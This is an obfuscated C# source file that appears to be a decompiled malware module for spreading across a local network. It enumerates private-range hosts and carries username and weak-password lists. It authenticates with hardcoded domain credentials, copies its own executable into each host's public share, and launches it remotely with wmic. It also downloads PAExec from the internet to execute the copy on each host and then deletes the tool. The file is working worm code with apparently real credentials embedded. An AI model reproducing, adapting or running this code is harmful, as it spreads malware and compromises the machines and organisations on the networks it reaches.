using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace MufMaOSvGyvz;

internal class IxJlmmAtIYbweZ
{
	public static List<string> wHmHGfpgcyEAPS = new List<string>();

	public static string SjeaxFYLqZIz = "";

	public static List<string> VimhkXdlfPlXCvI = new List<string>
	{
		"Administrator", "Admin", "Guest", "User", "User1", "user-1", "Test", "root", "buh", "boss",
		"ftp", "rdp", "rdpuser", "rdpadmin", "manager", "support", "work", "other user", "operator", "backup",
		"asus", "ftpuser", "ftpadmin", "nas", "nasuser", "nasadmin", "superuser", "netguest", "alex"
	};

	public static List<string> caCKFFEBtAvLMh = new List<string>
	{
		"Administrator", "administrator", "Guest", "guest", "User", "user", "Admin", "adminTest", "test", "root",
		"root", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "Administrator123",
		"administrator123", "Guest123", "guest123", "User123", "user123", "Admin123", "admin123Test123", "test123", "password", "111111",
		"55555", "77777", "777", "qwe", "qwe123", "qwe321", "qwer", "qwert", "qwerty", "qwerty123",
		"zxc", "zxc123", "zxcv", "uiop", "123321", "321", "love", "secret"
	};

	public static void DtsYjXXFKl()
	{
		try
		{
			wHmHGfpgcyEAPS = WPuYWIHaxaiFwM();
		}
		catch
		{
			return;
		}
		string text = "";
		if (wHmHGfpgcyEAPS.Count > 0)
		{
			try
			{
				text = aWbHWMZJwBHx();
			}
			catch
			{
				return;
			}
		}
		try
		{
			if (File.Exists(text))
			{
				foreach (string wHmHGfpgcyEAP in wHmHGfpgcyEAPS)
				{
					if (!wHmHGfpgcyEAP.StartsWith("10.") && !wHmHGfpgcyEAP.StartsWith("172.16.") && !wHmHGfpgcyEAP.StartsWith("192.168."))
					{
						continue;
					}
					try
					{
						if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
						{
							IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + wHmHGfpgcyEAP + " /USER:SHJPOLICE\\amer !Omar2012");
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + wHmHGfpgcyEAP + " /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
							}
						}
						else
						{
							IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + wHmHGfpgcyEAP);
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + wHmHGfpgcyEAP + " process call create cmd.exe /c \\\\" + wHmHGfpgcyEAP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
							}
						}
					}
					catch
					{
					}
					if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
					{
						IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, "\\" + wHmHGfpgcyEAP + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
					}
					else
					{
						IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, "\\" + wHmHGfpgcyEAP + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
					}
				}
			}
		}
		catch
		{
			return;
		}
		List<VJsusgqzfWSrbMi> list = VJsusgqzfWSrbMi.waPssoquJEsup();
		foreach (VJsusgqzfWSrbMi item in list)
		{
			try
			{
				if (item.IPAddress.StartsWith("10.") || item.IPAddress.StartsWith("172.16.") || item.IPAddress.StartsWith("192.168."))
				{
					OwlpRzDmPpi.KXPzXivlwAnerFl(item.MacAddress, item.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
				return;
			}
		}
		foreach (VJsusgqzfWSrbMi item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string string_ = regex.Split(item2.IPAddress)[0] + "." + regex.Split(item2.IPAddress)[1] + "." + regex.Split(item2.IPAddress)[2];
				List<string> list2 = uxsJIvhyQFYmmD.YvYIrpWzUqcA(string_);
				foreach (string item3 in list2)
				{
					string current = (SjeaxFYLqZIz = item3);
					foreach (string item4 in list2)
					{
						if (!item4.StartsWith("10.") && !item4.StartsWith("172.16.") && !item4.StartsWith("192.168."))
						{
							continue;
						}
						try
						{
							if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
							{
								IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + item4 + " /USER:SHJPOLICE\\amer !Omar2012");
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + item4 + " /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
								}
							}
							else
							{
								IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "use \\\\" + current);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("wmic.exe", "/node:" + item4 + " process call create cmd.exe /c \\\\" + item4 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location));
								}
							}
						}
						catch
						{
						}
						if (IyUWqQZlcOSTLhq.ylIKJJsgdllsSVj == "YES")
						{
							IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, "\\" + item4 + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
						}
						else
						{
							IyUWqQZlcOSTLhq.tbluQOozLSqDhFc(text, "\\" + item4 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
				}
			}
			catch
			{
				return;
			}
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	public static List<string> WPuYWIHaxaiFwM()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string aWbHWMZJwBHx()
	{
		if (IntPtr.Size == 8)
		{
			return ebvNzgnWqxnEn(new Uri("https://www.poweradmin.com/paexec/paexec.exe"));
		}
		return ebvNzgnWqxnEn(new Uri("https://www.poweradmin.com/paexec/paexec.exe"));
	}

	public static string ebvNzgnWqxnEn(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
